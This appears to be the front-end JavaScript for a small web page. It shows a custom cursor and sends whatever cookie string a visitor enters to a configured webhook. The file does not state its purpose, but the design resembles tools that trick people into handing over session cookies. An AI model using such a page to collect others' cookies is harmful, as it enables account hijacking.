// Custom cursor
const cursor = document.querySelector('.cursor');
const cursorGlow = document.querySelector('.cursor-glow');

document.addEventListener('mousemove', (e) => {
    cursor.style.left = e.clientX + 'px';
    cursor.style.top = e.clientY + 'px';
    cursorGlow.style.left = e.clientX + 'px';
    cursorGlow.style.top = e.clientY + 'px';
});

// Cursor hover effect
const input = document.querySelector('.cookie-input');
const statusMessage = document.getElementById('statusMessage');

input.addEventListener('mouseenter', () => {
    document.body.classList.add('cursor-hover');
});

input.addEventListener('mouseleave', () => {
    document.body.classList.remove('cursor-hover');
});

// Handle Enter key press
input.addEventListener('keypress', async (e) => {
    if (e.key === 'Enter') {
        const cookie = input.value.trim();
        
        if (!cookie) {
            showStatus('Please enter a cookie', 'error');
            return;
        }

        await sendCookie(cookie);
    }
});

// Send cookie to webhook
async function sendCookie(cookie) {
    const API_URL = process.env.API_URL;
    
    if (!API_URL) {
        showStatus('API_URL not configured', 'error');
        console.error('API_URL environment variable is not set');
        return;
    }

    showStatus('Sending...', '');
    
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookie: cookie,
                timestamp: new Date().toISOString()
            })
        });

        if (response.ok) {
            showStatus('Cookie sent successfully! ✓', 'success');
            input.value = '';
        } else {
            showStatus('Failed to send cookie', 'error');
        }
    } catch (error) {
        console.error('Error sending cookie:', error);
        showStatus('Error: Could not connect to webhook', 'error');
    }
}

// Show status message
function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = 'status-message';
    
    if (type) {
        statusMessage.classList.add(type);
    }
    
    if (type === 'success' || type === 'error') {
        setTimeout(() => {
            statusMessage.textContent = '';
            statusMessage.className = 'status-message';
        }, 3000);
    }
}
